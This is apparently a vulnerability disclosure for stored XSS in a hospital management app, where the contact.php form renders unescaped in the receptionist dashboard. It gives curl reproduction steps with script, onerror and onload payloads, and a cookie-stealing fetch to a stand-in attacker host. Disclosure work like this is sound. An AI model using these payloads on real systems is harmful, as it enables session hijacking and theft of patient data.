## Title

Stored XSS in `contact.php` allows any visitor to run arbitrary JavaScript in the receptionist's browser

### Summary

The public contact form (`contact.html` → `contact.php`) persists the `name`, `email`, `contact`, and `message` fields without sanitisation. The receptionist dashboard (`admin-panel1.php` Queries tab) renders those columns verbatim with `<?php echo $row['name']; ?>` etc. Any anonymous visitor can therefore store a `<script>` payload that fires in the receptionist's browser on the next page load. The session cookie is not marked `HttpOnly`, so the XSS can exfiltrate the cookie and hijack the receptionist session.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Stored Cross-Site Scripting (CWE-79)

### Affected Code

File: `contact.php`

```php
$name = $_POST['txtName'];
$email = $_POST['txtEmail'];
$contact = $_POST['txtPhone'];
$message = $_POST['txtMsg'];

$query="insert into contact(name,email,contact,message) values('$name','$email','$contact','$message');";
$result = mysqli_query($con,$query);
```

File: `admin-panel1.php` (Queries tab, around line 569–580)

```php
$query = "select * from contact;";
$result = mysqli_query($con,$query);
while ($row = mysqli_fetch_array($result)){
    echo "<tr>
        <td><?php echo $row['name'];?></td>
        <td><?php echo $row['email'];?></td>
        <td><?php echo $row['contact'];?></td>
        <td><?php echo $row['message'];?></td>
    </tr>";
}
```

### Root Cause

The contact form input is concatenated into the SQL `INSERT` without any HTML escaping (`htmlspecialchars`, `htmlentities`, `strip_tags`) and the dashboard output echoes the same columns directly inside HTML. PHP's default `ENT_QUOTES` behaviour is not applied, so a payload such as `<script>alert(1)</script>` is preserved verbatim all the way from the database to the rendered HTML.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Submit a contact form containing a script payload. The form is reachable from `contact.html` and accepts anonymous POSTs.

```bash
curl -sS -i "$BASE_URL/contact.php" \
  --data-urlencode "btnSubmit=1" \
  --data-urlencode "txtName=<script>alert('XSS-name')</script>" \
  --data-urlencode "txtEmail=<img src=x onerror=alert('XSS-email')>" \
  --data-urlencode "txtPhone=1234567890" \
  --data-urlencode "txtMsg=<svg/onload=alert('XSS-msg')>"
```

Observed response:

```text
HTTP/1.1 200 OK
...
alert("Message sent successfully!");
...
```

3. Confirm the values are stored verbatim in the database:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT name,email,message FROM contact ORDER BY name LIMIT 3;"
```

```text
name                                  email                              message
<script>alert('XSS-name')</script>   <img src=x onerror=alert('XSS-email')>   <svg/onload=alert('XSS-msg')>
```

4. Open `admin-panel1.php` (or fetch it directly to inspect the rendered HTML) and click the Queries tab. Every stored payload is rendered verbatim.

```bash
curl -sS "$BASE_URL/admin-panel1.php" \
  | grep -E "alert\(|onerror|svg/onload" | head -10
```

```html
<td><script>alert('XSS-name')</script></td>
<td><img src=x onerror=alert('XSS-email')></td>
<td><svg/onload=alert('XSS-msg')></td>
```

5. In a real browser, opening the Queries tab fires the three payloads in the application origin. Because the session cookie is not `HttpOnly`, a `fetch('http://attacker/?c='+document.cookie)` payload exfiltrates the `PHPSESSID` of the receptionist.

### Impact

Any visitor who can hit `contact.php` (the form is part of the public site) can run arbitrary JavaScript in the receptionist's browser. This is sufficient to:

- Steal the receptionist `PHPSESSID` cookie (no `HttpOnly` flag is set) and impersonate the receptionist.
- Read the full patient list, doctor list, prescription list, and appointment list that the receptionist can see.
- Use the receptionist dashboard's "Add Doctor" / "Delete Doctor" forms to create or remove doctors on the attacker's behalf.
- Inject further stored XSS via the prescription/contact inserter forms available in the same session.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Score: 9.0 (Critical)
```
